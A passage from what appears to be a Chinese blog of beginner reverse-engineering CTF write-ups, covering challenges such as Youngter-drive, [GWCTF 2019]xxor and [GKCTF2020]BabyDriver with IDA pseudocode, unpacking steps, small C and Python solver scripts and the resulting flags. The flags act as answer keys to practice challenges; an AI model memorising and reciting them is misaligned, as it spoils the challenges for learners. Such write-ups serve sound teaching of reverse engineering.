&amp;v5, &amp;v4);  if ( (unsigned int)__gmpz_cmp(&amp;v6, &amp;v7) )    puts(&quot;GG!&quot;);  else    puts(&quot;TTTTTTTTTTql!&quot;);  return 0LL;&#125;</code></pre><p>发现是一个rsa加密， __gmpz_init_set_str 函数是GNU 高精度算法库。</p><pre><code>c=0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35//密文n=103461035900816914121390101299049044413950405173712170434161686539878160984549e=65537</code></pre><p>先得到q，p。</p><pre><code>q=282164587459512124844245113950593348271p=366669102002966856876605669837014229419</code></pre><p>用脚本跑出来</p><pre><code>from Crypto.Util.number import *import gmpy2p = 282164587459512124844245113950593348271q = 366669102002966856876605669837014229419e = 65537c = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35n = q*pphi = (q-1)*(p-1)d = gmpy2.invert(e,phi)m = gmpy2.powmod(c,d,n)flag = long_to_bytes(m)print(flag)</code></pre><p>得到flag{Pwn_@_hundred_years}</p><h3 id="23-Youngter-drive"><a href="#23-Youngter-drive" class="headerlink" title="23.Youngter-drive"></a>23.Youngter-drive</h3><p>首先文件下载下来，PEID打开，发现upx加壳了。<br><img src="https://i.loli.net/2020/12/15/rlauFxIbs9ShpXH.png"></p><p>解壳<br><img src="https://i.loli.net/2020/12/15/OrQd6A2vZnFxWMz.png"><br>再用ida打开，找到主函数main_0，一进去就看得到，点进去在f5。</p><pre><code>int __thiscall main_0(void *this)&#123;  HANDLE v2; // [esp+D0h] [ebp-14h]  HANDLE hObject; // [esp+DCh] [ebp-8h]  sub_4110FF(this);  ::hObject = CreateMutexW(0, 0, 0);  j_strcpy(Dest, &amp;Source);  hObject = CreateThread(0, 0, StartAddress, 0, 0, 0);  v2 = CreateThread(0, 0, sub_41119F, 0, 0, 0);  CloseHandle(hObject);  CloseHandle(v2);  while ( dword_418008 != -1 )    ;  sub_411190();  CloseHandle(::hObject);  return 0;&#125;</code></pre><p>这里是查阅的一些函数</p><pre><code>CreateThread和CloseHandle：CreateThread是一种微软在Windows API中提供了建立新的线程的函数，该函数在主线程的基础上创建一个新线程。线程终止运行后，线程对象仍然在系统中，必须通过CloseHandle函数来关闭该线程对象。Sleep：Sleep函数可以使计算机程序（进程，任务或线程）进入休眠，使其在一段时间内处于非活动状态。当函数设定的计时器到期，或者接收到信号、程序发生中断都会导致程序继续执行。本来线程是同时进行的，然而这一道题就是通过sleep这个函数让线程交替进行了，导致了偶数位没进行加密，奇数位进行了加密。</code></pre><p>下面来分析这个主函数<br><img src="https://i.loli.net/2020/12/15/yZUlpsqvwYDPWgf.png"><br>然后主要分析这两个线程<br><img src="https://i.loli.net/2020/12/15/J6WVmSgQB7qyRYu.png"><br>进入那个加密函数，报错无法看源代码。<br><img src="https://i.loli.net/2020/12/15/rTFhlV1C9Kij4ad.png"><br>说是栈顶sp有问题，然后找到该函数位置。<br><img src="https://i.loli.net/2020/12/15/PhO8GyxiUCe5d3s.png"><br>修改sp<br><img src="https://i.loli.net/2020/12/15/prDmANUXsjZ7Lqk.png"><br>然后得到加密函数。</p><pre><code>char *__cdecl sub_411940(int a1, int a2)//a1是那个source(你输入的flag)，a2是那个dword_418008(29)&#123;  char *result; // eax  char v3; // [esp+D3h] [ebp-5h]  v3 = *(_BYTE *)(a2 + a1);//相当与a[a2],source[a2]。  if ( (v3 &lt; 97 || v3 &gt; 122) &amp;&amp; (v3 &lt; 65 || v3 &gt; 90) )    exit(0);//这里是必须要你输入的flag是是A~Z,a~z。  if ( v3 &lt; 97 || v3 &gt; 122 )//如果source[a2]是大写字母，就这样加密  &#123;    result = off_418000[0];    *(_BYTE *)(a2 + a1) = off_418000[0][*(char *)(a2 + a1) - 38];  &#125;  else//如果source[a2]是小写字母，就这样加密  &#123;    result = off_418000[0];    *(_BYTE *)(a2 + a1) = off_418000[0][*(char *)(a2 + a1) - 96];  &#125;  return result;&#125;</code></pre><p>注意这一句</p><pre><code>off_418000[0][*(char *)(a2 + a1) - 96];等价于off_418000[*(a2 + a1) - 96]//这个*(a2+a1)是未加密的，也就是你要求的flag。</code></pre><p>一些数据</p><pre><code>off_418000[]=QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm加密后的*(_BYTE *)(a2 + a1)=TOiZiZtOrYaToUwPnToBsOaOapsyS</code></pre><p>然后开始写脚本，</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    char str[30]=&quot;TOiZiZtOrYaToUwPnToBsOaOapsyS&quot;;//off_418004    char str1[53]=&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;;//off_418000    char flag[30];    int a[30];    int b[30];    int i,j,m=0;    for(i=0;i&lt;29;i++)    &#123;        if(i%2==0)        flag[i]=str[i];    &#125;    for(i=0;i&lt;29;i++)    &#123;        for(j=0;j&lt;52;j++)        &#123;                if(str[i]==str1[j])            &#123;//                printf(&quot;%d &quot;,j);                if(j&lt;27)//这个27是算出来的，是决定是字母大写，字母小写的临界值                 &#123;                    flag[m]=j+96;                    m++;                &#125;                else                &#123;                    flag[m]=j+38;                    m++;                &#125;            &#125;            &#125;    &#125;    for(i=0;i&lt;29;i++)//这个for循环就是因为两个线程交替进行的原因，偶数位不加密，奇数位要加密     &#123;        if(i%2==0)        flag[i]=str[i];    &#125;    for(i=0;i&lt;29;i++)    &#123;        printf(&quot;%c&quot;,flag[i]);    &#125; &#125; </code></pre><p>网上找的Python脚本如下</p><pre><code>str=&quot;0abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;text1=&#39;TOiZiZtOrYaToUwPnToBsOaOapsyS&#39;text2=&#39;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#39;flag=&#39;&#39;s=0for i in range(len(text1)):    if(i%2==0):        flag+=text1[i]    else:        s=text2.index(text1[i])        flag+=str[s]print(flag)</code></pre><p>得到ThisisthreadofwindowshahaIsES，但这不是flag，真正的flag还要在后面加一个E(我也不知道为什么)，得到flag{ThisisthreadofwindowshahaIsESE}</p><h3 id="24-GUET-CTF2019-re"><a href="#24-GUET-CTF2019-re" class="headerlink" title="24.[GUET-CTF2019]re"></a>24.[GUET-CTF2019]re</h3><p>文件下载下来用Exeinfo PE打开<br><img src="https://i.loli.net/2020/12/17/qw12XmRduUgZMKn.png"><br>发现是upx加壳，解壳<br><img src="https://i.loli.net/2020/12/17/9eusW1ftcB3mYiy.png"><br>IDA打开，找到关键代码<br><img src="https://i.loli.net/2020/12/17/c7AirZMUtqIBuwd.png"><br>去看看加密函数</p><pre><code>_BOOL8 __fastcall sub_4009AE(char *a1)&#123;  if ( 1629056 * *a1 != 166163712 )    return 0LL;  if ( 6771600 * a1[1] != 731332800 )    return 0LL;  if ( 3682944 * a1[2] != 357245568 )    return 0LL;  if ( 10431000 * a1[3] != 1074393000 )    return 0LL;  if ( 3977328 * a1[4] != 489211344 )    return 0LL;  if ( 5138336 * a1[5] != 518971936 )    return 0LL;  if ( 7532250 * a1[7] != 406741500 )    return 0LL;  if ( 5551632 * a1[8] != 294236496 )    return 0LL;  if ( 3409728 * a1[9] != 177305856 )    return 0LL;  if ( 13013670 * a1[10] != 650683500 )    return 0LL;  if ( 6088797 * a1[11] != 298351053 )    return 0LL;  if ( 7884663 * a1[12] != 386348487 )    return 0LL;  if ( 8944053 * a1[13] != 438258597 )    return 0LL;  if ( 5198490 * a1[14] != 249527520 )    return 0LL;  if ( 4544518 * a1[15] != 445362764 )    return 0LL;  if ( 3645600 * a1[17] != 174988800 )    return 0LL;  if ( 10115280 * a1[16] != 981182160 )    return 0LL;  if ( 9667504 * a1[18] != 493042704 )    return 0LL;  if ( 5364450 * a1[19] != 257493600 )    return 0LL;  if ( 13464540 * a1[20] != 767478780 )    return 0LL;  if ( 5488432 * a1[21] != 312840624 )    return 0LL;  if ( 14479500 * a1[22] != 1404511500 )    return 0LL;  if ( 6451830 * a1[23] != 316139670 )    return 0LL;  if ( 6252576 * a1[24] != 619005024 )    return 0LL;  if ( 7763364 * a1[25] != 372641472 )    return 0LL;  if ( 7327320 * a1[26] != 373693320 )    return 0LL;  if ( 8741520 * a1[27] != 498266640 )    return 0LL;  if ( 8871876 * a1[28] != 452465676 )    return 0LL;  if ( 4086720 * a1[29] != 208422720 )    return 0LL;  if ( 9374400 * a1[30] == 515592000 )    return 5759124 * a1[31] == 719890500;  return 0LL;&#125;</code></pre><p>直接除过去就能得到flag，只不过题有点问题，没有a[6]，看了其他wp是1。<br>脚本如下，比较痛苦。</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    long long a1[33];    int i;    a1[0] = 166163712/1629056;       a1[1] = 731332800/6771600;    a1[2] = 357245568/3682944;     a1[3] = 1074393000/10431000;    a1[4] = 489211344/3977328;    a1[5] = 518971936/5138336;    a1[7] = 406741500/7532250;    a1[8] = 294236496/5551632;    a1[9] = 177305856/3409728;    a1[10] = 650683500/13013670;    a1[11] = 298351053/6088797;    a1[12] = 386348487/7884663;    a1[13] = 438258597/8944053;    a1[14] = 249527520/5198490;    a1[15] = 445362764/4544518;     a1[17] = 174988800/3645600;    a1[16] = 981182160/10115280;    a1[18] = 493042704/9667504;    a1[19] = 257493600/5364450;    a1[20] = 767478780/13464540;    a1[21] = 312840624/5488432;    a1[22] = 1404511500/14479500;    a1[23] = 316139670/6451830;    a1[24] = 619005024/6252576;    a1[25] = 372641472/7763364;    a1[26] = 373693320/7327320;    a1[27] = 498266640/8741520;    a1[28] = 452465676/8871876;    a1[29] = 208422720/4086720;    a1[30] =515592000/9374400;    a1[31] =719890500/5759124;    for(i=0;i&lt;33;i++)    &#123;        printf(&quot;%c&quot;,a1[i]);    &#125;    return 0;&#125;</code></pre><p>得到flag{e165421110ba03099a1c039337}</p><h3 id="25-FlareOn4-login"><a href="#25-FlareOn4-login" class="headerlink" title="25.[FlareOn4]login"></a>25.[FlareOn4]login</h3><p>文件下载下来是一个html文件，打开看源代码</p><pre><code>&lt;!DOCTYPE Html /&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;FLARE On 2017&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;input type=&quot;text&quot; name=&quot;flag&quot; id=&quot;flag&quot; value=&quot;Enter the flag&quot; /&gt;        &lt;input type=&quot;button&quot; id=&quot;prompt&quot; value=&quot;Click to check the flag&quot; /&gt;        &lt;script type=&quot;text/javascript&quot;&gt;            document.getElementById(&quot;prompt&quot;).onclick = function () &#123;                var flag = document.getElementById(&quot;flag&quot;).value;                var rotFlag = flag.replace(/[a-zA-Z]/g, function(c)&#123;return String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26);&#125;);//这个就是加密过程。                if (&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot; == rotFlag) &#123;                    alert(&quot;Correct flag!&quot;);                &#125; else &#123;                    alert(&quot;Incorrect flag, rot again&quot;);                &#125;            &#125;        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>上面的加密过程由于没学JS有点看不懂，有点像C语言的简写条件(?:)<a href="https://blog.csdn.net/whh4122/article/details/39271277?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">条件语句的简写</a>。但是看到了’a’,’z’,’A’,’Z’,就用凯撒脚本爆破了一下。</p><pre><code>#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;stdio.h&gt;int main(void)&#123;    char table1[27]=&quot;abcdefghijklmnopqrstuvwxyz&quot;;    char table2[27]=&quot;ABCDEFJHIJKLMNOPQRSTUVWXYZ&quot;;    char str1[100]=&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;;    char str2[100]=&quot;&quot;;    int i,k,len;    len=strlen(str1);    for(k=0;k&lt;26;k++)    &#123;        for(i=0;i&lt;len;i++)        &#123;            if(str1[i]&gt;=table1[k]&amp;&amp;str1[i]&lt;=&#39;z&#39;)            &#123;                str2[i]=str1[i]-k;            &#125;            else if(str1[i]&lt;table1[k]&amp;&amp;str1[i]&gt;=&#39;a&#39;)            &#123;                str2[i]=str1[i]+26-k;            &#125;            else if(str1[i]&gt;=table2[k]&amp;&amp;str1[i]&lt;=&#39;Z&#39;)            &#123;                str2[i]=str1[i]-k;            &#125;            else if(str1[i]&lt;table2[k]&amp;&amp;str1[i]&gt;=&#39;A&#39;)            &#123;                str2[i]=str1[i]+26-k;            &#125;                        else            &#123;                str2[i]=str1[i];            &#125;        &#125;        printf(&quot;%s&quot;,str2);        printf(&quot;\n&quot;);    &#125; &#125; </code></pre><p>得到</p><pre><code>PyvragFvqrYbtvafNerRnfl@syner-ba.pbzOxuqzfEupqXasuzeMdqQmek@rxmdq-az.oayNwtpyeDtopWzrtydLcpPldj@qwlcp-zy.nzxMvsoxdCsnoVyqsxcKboOkci@pvkbo-yx.mywLurnwcBrmnUxprwbJanNjbh@oujan-xw.lxvKtqmvbAqlmTwoqvaIzmMiag@ntizm-wv.kwuJspluaZpklSvnpuzHylLhzf@mshyl-vu.jvtIroktzYojkRumotyGxkKgye@lrgxk-ut.iusHqnjsyXnijQtlnsxFwjJfxd@kqfwj-ts.htrGpmirxWmhiPskmrwEviIewc@jpevi-sr.gsqFolhqwVlghOrjlqvDuhHdvb@ioduh-rq.frpEnkgpvUkfgNqikpuCtgGcua@hnctg-qp.eqoDmjfouTjefMphjotBsfFbtz@gmbsf-po.dpnClientSideLoginsAreEasy@flare-on.com//flagBkhdmsRhcdKnfhmrZqdDzrx@ekzqd-nm.bnlAjgclrQgbcJmeglqYpcCyqw@djypc-ml.amkZifbkqPfabIldfkpXobBxpv@cixob-lk.zljYheajpOezaHkcejoWnaAwou@bhwna-kj.ykiXgdzioNdyzGjbdinVmzZvnt@agvmz-ji.xjhWfcyhnMcxyFiachmUlyYums@zfuly-ih.wigVebxgmLbwxEhzbglTkxXtlr@yetkx-hg.vhfUdawflKavwDgyafkSjwWskq@xdsjw-gf.ugeTczvekJzuvCfxzejRivVrjp@wcriv-fe.tfdSbyudjIytuBewydiQhuUqio@vbqhu-ed.secRaxtciHxstAdvxchPgtTphn@uapgt-dc.rdbQzwsbhGwrsZcuwbgOfsSogm@tzofs-cb.qca</code></pre><p>感觉实际上那个加密就是位移为13的凯撒加密。得到flag{ClientSideLoginsAreEasy@flare-on.com}</p><h3 id="26-ACTF新生赛2020-usualCrypt"><a href="#26-ACTF新生赛2020-usualCrypt" class="headerlink" title="26.[ACTF新生赛2020]usualCrypt"></a>26.[ACTF新生赛2020]usualCrypt</h3><p>文件直接用IDA打开，然后找到关键代码部分<br><img src="https://i.loli.net/2020/12/17/7eZFq198vSUlnCH.png"><br>然后看加密函数</p><p>换表函数<br><img src="https://i.loli.net/2020/12/17/dlFEjnHMB97XpRs.png"><br>大写字母转小写字母，小写字母转大写字母函数。<br><img src="https://i.loli.net/2020/12/17/nkP5d6sLJxCzbUc.png"><br>写出脚本</p><p>脚本1，大写字母转小写字母，小写字母转大写字母</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    char a[37]=&quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&quot;;    int i;    for(i=0;i&lt;36;i++)    &#123;         if(a[i]&gt;=&#39;a&#39;&amp;&amp;a[i]&lt;=&#39;z&#39;)        &#123;            a[i]=a[i]-32;        &#125;        else if(a[i]&gt;=&#39;A&#39;&amp;&amp;a[i]&lt;=&#39;Z&#39;)        &#123;            a[i]=a[i]+32;        &#125;        else        &#123;            a[i]=a[i];        &#125;        printf(&quot;%c&quot;,a[i]);    &#125; &#125; </code></pre><p>得到ZmxhZ3tiGNXlXjHfaDTzN2FfK3LycRTpc2L9，由于不想去改表了所以弄了个Python的脚本。</p><pre><code>import base64import stringstr1 = &quot;ZmxhZ3tiGNXlXjHfaDTzN2FfK3LycRTpc2L9&quot;string1 = &quot;ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))</code></pre><p>得到flag{bAse64_h2s_a_Surprise}</p><h3 id="27-GWCTF-2019-xxor"><a href="#27-GWCTF-2019-xxor" class="headerlink" title="27.[GWCTF 2019]xxor"></a>27.[GWCTF 2019]xxor</h3><p>直接IDA打开，找到关键代码，分析过程也在里面了。<br><img src="https://i.loli.net/2020/12/17/2yhf3F4iGJUnvrK.png"><br>一些资料</p><pre><code>#define LOWORD(l) ((WORD)((DWORD_PTR)(l) &amp; 0xffff))#define HIWORD(l) ((WORD)((DWORD_PTR)(l) &gt;&gt; 16))这是baiwindef.h头文件中对宏LOWORD和HIWORD的定义。du作用分别是取出无符号长整型zhi参数dao的高16位和低16位。因为一zhuan个长整型占32位，其中高低16位的值可能有不同的意义，需要通过这2个宏分别取出来使用。取出来的结果是一个无符号短整型的值。其原理正如定义那样，取低16位的宏LOWORD使用按位与操作符与数字0xffff运算，而数字0xffff是一个低16位全为1的数字，那么对其位与操作可以得到参数的低16位。而取高16位的宏HIWORD则更简单，只需将参数右移16位，剩下的就是原高16位的值了。</code></pre><p>脚本如下</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    unsigned int v7[6];    unsigned int a2[4]=&#123;2,2,3,4&#125;;    unsigned int i,j,v5=0,v4,v3;//注意，这里必须是unsigned int代表无符号整型。    int v6[6];    v7[0]=3746099070;    v7[1]=550153460;//    V7[3]+V7[4]=4201428739;//    V7[3]-V7[4]=-1103824215;//    V7[2]-V7[3]=2225223423;    v7[2]=3774025685;    v7[3]=1548802262;    v7[4]=2652626477;    v7[5]=2230518816;    for(i=0;i&lt;6;i++)    &#123;        printf(&quot;%#x &quot;,v7[i]);    &#125;    for(j=0;j&lt;5;j+=2)    &#123;        v3=v7[j];        v4=v7[j+1];        v5 = 1166789954*0x40;        for(i=0;i&lt;=63;i++)        &#123;            v4 -=(v3 + v5 + 20) ^ ((v3 &lt;&lt; 6) + a2[2]) ^ ((v3 &gt;&gt; 9) + a2[3]) ^ 0x10;            v3 -= (v4 + v5 + 11) ^ ((v4 &lt;&lt; 6) + a2[0]) ^ ((v4 &gt;&gt; 9) + a2[1]) ^ 0x20;            v5 -= 1166789954;        &#125;        v7[j]=v3;        v7[j+1]=v4;    &#125;    printf(&quot;\n&quot;);    for(i=0;i&lt;6;i++)    &#123;        printf(&quot;%x&quot;,v7[i]);     &#125;    printf(&quot;\n&quot;);     for (int i = 0; i &lt; 6; ++i)         /*将整型数组作为字符输出，注意计算机小端排序*/        printf(&quot;%c%c%c&quot;, *((char*)&amp;v7[i] + 2), *((char*)&amp;v7[i] + 1), *(char*)&amp;v7[i]); &#125; </code></pre><p>得到</p><p><img src="https://i.loli.net/2020/12/17/lWt63zh2K1p5qTm.png"><br>然后脚本提到的小端排序是指</p><p><img src="https://i.loli.net/2020/12/17/EstajDBAwHKguvQ.png"><br>flag{re_is_great!}</p><h3 id="28-HDCTF2019-Maze"><a href="#28-HDCTF2019-Maze" class="headerlink" title="28.[HDCTF2019]Maze"></a>28.[HDCTF2019]Maze</h3><p>文件下载下来用Exeinfo PE打开</p><p><img src="https://i.loli.net/2020/12/17/nI1zFZEpqGxYKod.png"></p><p>解壳过程因为前面题已经有了，所以略过，解壳后的程序用IDA打开，然后发现有一个花指令<br><img src="https://i.loli.net/2020/12/17/TEc4uSCInV3JNzU.png"><br>去花(怎么去花指令可以看看我那篇关于花指令的文章)<br><img src="https://i.loli.net/2020/12/17/2aq83VcfQmzxbWk.png"><br>改E8为90<br><img src="https://i.loli.net/2020/12/17/RUYSBZGnm5QalEf.png"><br>然后p键<br><img src="https://i.loli.net/2020/12/17/gVSRmAnDd5N1KCp.png"><br>f5看伪代码</p><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)&#123;  int i; // [esp+10h] [ebp-14h]  char v5[16]; // [esp+14h] [ebp-10h] BYREF  sub_401140(aGoThroughTheMa);  scanf(&quot;%14s&quot;, v5);  for ( i = 0; i &lt;= 13; ++i )  &#123;    switch ( v5[i] )//上下左右键分别为wsad。    &#123;      case &#39;a&#39;:        --*(_DWORD *)asc_408078;        break;      case &#39;d&#39;:        ++*(_DWORD *)asc_408078;        break;      case &#39;s&#39;:        --dword_40807C;        break;      case &#39;w&#39;:        ++dword_40807C;        break;      default:        continue;    &#125;  &#125;  if ( *(_DWORD *)asc_408078 == 5 &amp;&amp; dword_40807C == -4 )//这里是通过你的移动然后改变了asc_408078(初始值是7)，dword_40807C，然后如果这两个值满足这个条件，就是说明到了终点  &#123;    sub_401140(aCongratulation);    sub_401140(aHereIsTheFlagF);  &#125;  else  &#123;    sub_401140(aTryAgain);  &#125;  return 0;&#125;</code></pre><p>shift+12，shift+e，得到地图，<br><img src="https://i.loli.net/2020/12/17/jknacGyVAE5pPrs.png"><br>脚本画出地图</p><pre><code>#include&lt;stdio.h&gt;//ssaaasaassdddwint main(void)&#123;    int a[7][10]=&#123;42,  42,  42,  42,  42,  42,  42,  43,  42,  42,    42,  42,  42,  42,  42,  42,  42,  32,  42,  42,    42,  42,  42,  42,  32,  32,  32,  32,  42,  42,    42,  42,  32,  32,  32,  42,  42,  42,  42,  42,    42,  42,  32,  42,  42,  70,  42,  42,  42,  42,    42,  42,  32,  32,  32,  32,  42,  42,  42,  42,    42,  42,  42,  42,  42,  42,  42,  42,  42,  42, &#125;;   int i,j;   for(i=0;i&lt;7;i++)   &#123;           for(j=0;j&lt;10;j++)           &#123;               printf(&quot;%c&quot;,a[i][j]);        &#125;        printf(&quot;\n&quot;);   &#125;&#125; </code></pre><p>地图7*10的地图</p><pre><code>*******+********* ******    ****   ******* **F******    **************</code></pre><p>得到flag{ssaaasaassdddw}</p><h3 id="29-WUSTCTF2020-level1"><a href="#29-WUSTCTF2020-level1" class="headerlink" title="29.[WUSTCTF2020]level1"></a>29.[WUSTCTF2020]level1</h3><p>文件下载下来有两个，用IDA打开level1，找到关键代码。<br><img src="https://i.loli.net/2020/12/19/NO97HQij5UrZLwV.png"><br>开始写脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[20]=&#123;0,198,232,816,200,1536,300,6144,984,51200,570,92160,1200,565248,756,1474560,800,6291456,1782,65536000&#125;;//注意a[0]设置的值为0；    int i;    for(i=1;i&lt;20;i++)    &#123;        if(i%2==0)            a[i]=a[i]/i;        else            a[i]=a[i]&gt;&gt;i;    &#125;    for(i=1;i&lt;20;i++)    &#123;        printf(&quot;%c&quot;,a[i]);    &#125;&#125; </code></pre><p>得到flag{d9-dE6-20c}</p><h3 id="30-WUSTCTF2020-level2"><a href="#30-WUSTCTF2020-level2" class="headerlink" title="30.[WUSTCTF2020]level2"></a>30.[WUSTCTF2020]level2</h3><p>文件下载下来用Exeinfo PE打开，发现是upx加壳<br><img src="https://i.loli.net/2020/12/19/lYVONL5iFDs1fyJ.png"><br>然后解壳<br><img src="https://i.loli.net/2020/12/19/M3QNbAvStiCKV6n.png"><br>再用IDA打开文件，直接就可以看到flag{Just_upx_-d}</p><h3 id="31-FlareOn4-IgniteMe"><a href="#31-FlareOn4-IgniteMe" class="headerlink" title="31.[FlareOn4]IgniteMe"></a>31.[FlareOn4]IgniteMe</h3><p>这道题需要IDA静态调试和x32dbg动态调试一起。</p><p>先放到IDA里面<br><img src="https://i.loli.net/2020/12/19/7BOHJDiIbowkVTR.png"><br>在继续到x32dbg里面看主函数框架。<br><img src="https://i.loli.net/2020/12/19/5rsFEleQfynDSXu.png"><br>然后进入那个比较函数。<br><img src="https://i.loli.net/2020/12/19/kuF9NYHnz2a5WZi.png"><br>现在就来动调找v4的值，在x32dbg里面进入那个比较函数之后。<br><img src="https://i.loli.net/2020/12/19/q8phQB2SJExDfYZ.png"><br>得到v4=4，现在开始写脚本，如下。</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int v4[40]=&#123; 0x0D, 0x26, 0x49, 0x45, 0x2A, 0x17, 0x78, 0x44, 0x2B, 0x6C,   0x5D, 0x5E, 0x45, 0x12, 0x2F, 0x17, 0x2B, 0x44, 0x6F, 0x6E,   0x56, 0x09, 0x5F, 0x45, 0x47, 0x73, 0x26, 0x0A, 0x0D, 0x13,   0x17, 0x48, 0x42, 0x01, 0x40, 0x4D, 0x0C, 0x02, 0x69&#125;;//byte_403000[]的内容。注意我设置v4的长度为40。   int i;   v4[39]=4; //v4的值   for(i=38;i&gt;=0;i--)//得到flag的值   &#123;       v4[i]=v4[i]^v4[i+1];       printf(&quot;%c &quot;,v4[i]);   &#125;   printf(&quot;\n&quot;);   for(i=0;i&lt;39;i++)//正序输出   &#123;       printf(&quot;%c&quot;,v4[i]);   &#125; &#125; </code></pre><h3 id="32-MRCTF2020-Xor"><a href="#32-MRCTF2020-Xor" class="headerlink" title="32.[MRCTF2020]Xor"></a>32.[MRCTF2020]Xor</h3><p>IDA打开<br><img src="https://i.loli.net/2020/12/19/7LTiMcHzV3pkSly.png"><br>然后f5，看关键代码。<br><img src="https://i.loli.net/2020/12/19/zNTCW7rw6kP5StB.png"><br>开始写脚本。</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[27]=&#123;&#39;M&#39;, &#39;S&#39;, &#39;A&#39;, &#39;W&#39;, &#39;B&#39;, &#39;~&#39;, &#39;F&#39;, &#39;X&#39;, &#39;Z&#39;, &#39;:&#39;, &#39;J&#39;, &#39;:&#39;, &#39;`&#39;, &#39;t&#39;, &#39;Q&#39;, &#39;J&#39;, &#39;&quot;&#39;, &#39;N&#39;, &#39;@&#39;, &#39; &#39;, &#39;b&#39;, &#39;p&#39;, &#39;d&#39;, &#39;d&#39;, &#39;&#125;&#39;, &#39;8&#39;, &#39;g&#39;&#125;;    int i;    for(i=0;i&lt;27;i++)    &#123;        a[i]=a[i]^i;        printf(&quot;%c&quot;,a[i]);    &#125; &#125; </code></pre><p>得到flag{@_R3@1ly_E2_R3verse!}</p><h3 id="33-GKCTF2020-BabyDriver"><a href="#33-GKCTF2020-BabyDriver" class="headerlink" title="33.[GKCTF2020]BabyDriver"></a>33.[GKCTF2020]BabyDriver</h3><p>迷宫题，IDA打开</p><pre><code>__int64 __fastcall sub_140001380(__int64 a1, __int64 a2)&#123;  __int64 v3; // rdi  __int64 v4; // rax  int v5; // ecx  __int16 *v6; // rsi  __int64 v7; // rbp  __int16 v8; // dx  char v9; // dl  const CHAR *v10; // rcx  if ( *(int *)(a2 + 48) &gt;= 0 )  &#123;    v3 = *(_QWORD *)(a2 + 24);    v4 = *(_QWORD *)(a2 + 56) &gt;&gt; 3;    if ( (_DWORD)v4 )    &#123;      v5 = dword_1400030E4;      v6 = (__int16 *)(v3 + 2);      v7 = (unsigned int)v4;      while ( *(_WORD *)(v3 + 4) )      &#123;LABEL_28:        v6 += 6;        if ( !--v7 )          goto LABEL_29;      &#125;      aO[v5] = 46;      v8 = *v6;      if ( *v6 == 23 )      &#123;        if ( (v5 &amp; 0xFFFFFFF0) != 0 )        &#123;          v5 -= 16;//可以知道宽度为16          goto LABEL_21;        &#125;        v5 += 208;        dword_1400030E4 = v5;      &#125;      if ( v8 == 37 )      &#123;        if ( (v5 &amp; 0xFFFFFFF0) != 208 )        &#123;          v5 += 16;          goto LABEL_21;        &#125;        v5 -= 208;        dword_1400030E4 = v5;      &#125;      if ( v8 == 36 )      &#123;        if ( (v5 &amp; 0xF) != 0 )        &#123;          --v5;          goto LABEL_21;        &#125;        v5 += 15;        dword_1400030E4 = v5;      &#125;      if ( v8 != 38 )        goto LABEL_22;      if ( (v5 &amp; 0xF) == 15 )        v5 -= 15;      else        ++v5;LABEL_21:      dword_1400030E4 = v5;LABEL_22:      v9 = aO[v5];      if ( v9 == 42 )//等于42(*)就不行。      &#123;        v10 = &quot;failed!\n&quot;;      &#125;      else      &#123;        if ( v9 != 35 )//35(#),结尾        &#123;LABEL_27:          aO[v5] = 111;//111(o),开头          goto LABEL_28;        &#125;        v10 = &quot;success! flag is flag&#123;md5(input)&#125;\n&quot;;//最后得到的移动字符串还要进行md5加密。      &#125;      dword_1400030E4 = 16;      DbgPrint(v10);      v5 = dword_1400030E4;      goto LABEL_27;    &#125;  &#125;LABEL_29:  if ( *(_BYTE *)(a2 + 65) )    *(_BYTE *)(*(_QWORD *)(a2 + 184) + 3i64) |= 1u;  return *(unsigned int *)(a2 + 48);&#125;</code></pre><p>大概分析一下就是a0[i]是迷宫是一个，14(行)*16(列)的迷宫，v5是到达的位置(也就是a0[i]中的i)，然后35(#)结尾，111(o)开头。上下左右分别是23，37，36,38。</p><p>shift+e提取迷宫<br><img src="https://i.loli.net/2020/12/19/blpFrxXDqvYza64.png"><br><img src="https://i.loli.net/2020/12/19/hOInAwMirtNuEoD.png"><br>开始走迷宫，得到38373737383837383737373838383737373838383838，然后进行md5加密，发现提交时不对，然后去看了wp，发现由于这是sys驱动文件，是由键盘过滤驱动获取键盘扫描码来控制上下左右，所以上下左右不是这几个值，而是IKJL。</p><p>键盘扫描码<br><img src="https://i.loli.net/2020/12/19/Z47irEXJHSOceTC.png"><br>最后得到flag{403950a6f64f7fc4b655dea696997851}</p><h3 id="34-MRCTF2020-hello-world-go"><a href="#34-MRCTF2020-hello-world-go" class="headerlink" title="34.[MRCTF2020]hello_world_go"></a>34.[MRCTF2020]hello_world_go</h3><p>文件下载下来，直接用ida打开，选到hex 